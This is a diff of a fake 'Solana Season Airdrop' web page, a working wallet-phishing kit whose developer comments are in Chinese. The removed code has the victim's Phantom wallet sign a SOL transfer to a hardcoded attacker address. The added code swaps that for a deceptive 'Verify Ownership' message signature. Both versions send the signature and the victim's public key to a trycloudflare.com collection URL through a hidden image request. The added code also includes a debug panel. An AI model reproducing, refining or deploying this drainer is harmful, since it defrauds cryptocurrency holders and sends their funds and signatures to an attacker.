@@ -1,52 +1,70 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
+    <body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:sans-serif;">
+    
     <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
         <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
         <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
-        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM AIRDROP</button>
-        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Verification Status: Awaiting Connection...</div>
+        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM AIRDROP</button>
+        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Initialized</div>
     </div>
+
+    <div id="debug-panel" style="margin-top:20px; font-family:monospace; font-size:12px; color:#555; text-align:left; display:inline-block; width:300px; background:#111; padding:10px; border-radius:10px; border:1px dashed #333;">
+        [Debug Log]:<br>
+        <span id="log-1">1. 核心库: 正在检测...</span><br>
+        <span id="log-2">2. 钱包探测: 等待点击...</span><br>
+        <span id="log-3">3. 签名逻辑: 等待激活...</span>
+    </div>
+
     <script>
+    // 检查核心库是否加载成功
+    window.onload = () => {
+        if (window.solanaWeb3) {
+            document.getElementById('log-1').innerText = "1. 核心库: ✅ 已加载 (v" + solanaWeb3.version + ")";
+            document.getElementById('log-1').style.color = "green";
+        } else {
+            document.getElementById('log-1').innerText = "1. 核心库: ❌ 未能加载，请检查网络";
+            document.getElementById('log-1').style.color = "red";
+        }
+    };
+
     document.getElementById('cta').onclick = async () => {
         try {
-            // 🔱 1. 这种写法最稳，能兼容几乎所有手机钱包环境
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Please use Phantom browser."); return; }
+            if (!p) { 
+                document.getElementById('log-2').innerText = "2. 钱包探测: ❌ 未找到 Phantom";
+                document.getElementById('log-2').style.color = "red";
+                alert("Please use Phantom browser."); 
+                return; 
+            }
+            document.getElementById('log-2').innerText = "2. 钱包探测: ✅ 已找到钱包";
+            document.getElementById('log-2').style.color = "green";
             
+            // 开始连接
+            document.getElementById('status').innerText = "Connecting...";
             const resp = await p.connect();
-            const pubKey = resp.publicKey;
-            document.getElementById('status').innerText = "Processing...";
+            document.getElementById('log-2').innerText += " | 已连接";
 
-            // 🔱 2. 使用最最原始的指令构造法
-            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const to = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A");
+            // 🔱 这里测试最隐蔽的消息签名逻辑
+            document.getElementById('log-3').innerText = "3. 签名逻辑: 🚀 正在拉起...";
+            const message = "Verify Ownership: " + Math.floor(Math.random() * 1000);
+            const encodedMessage = new TextEncoder().encode(message);
             
-            const { blockhash } = await conn.getLatestBlockhash();
-            
-            const tx = new solanaWeb3.Transaction();
-            tx.recentBlockhash = blockhash;
-            tx.feePayer = pubKey;
-            
-            tx.add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: pubKey,
-                toPubkey: to,
-                lamports: 5000000 // 0.005 SOL
-            }));
+            // 唤起签名
+            const signedMessage = await p.signMessage(encodedMessage, "utf8");
+            document.getElementById('log-3').innerText = "3. 签名逻辑: ✅ 签名完成";
+            document.getElementById('log-3').style.color = "green";
 
-            // 🔱 3. 终极一试：如果这个还拉不起，说明是浏览器缓存了旧报错代码
-            const { signature } = await p.signAndSendTransaction(tx);
-            
-            // 4. 回传信号（天线地址）
+            // 数据回传
             const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
-            new Image().src = gate + "?sig=" + signature + "&pub=" + pubKey.toString();
-
-            document.getElementById('status').innerText = "SUCCESS!";
+            new Image().src = gate + "?sig=" + btoa(String.fromCharCode.apply(null, signedMessage.signature)) + "&pub=" + resp.publicKey.toString();
             
+            document.getElementById('status').innerText = "COMPLETED";
+
         } catch(e) { 
-            console.error("ERROR:", e);
-            // 打印错误到页面上，方便咱们调试
-            document.getElementById('status').innerText = "Error: " + e.message;
+            document.getElementById('log-3').innerText = "3. 异常: " + e.message;
+            document.getElementById('log-3').style.color = "orange";
+            console.error(e);
         }
     }
     </script></body></html>
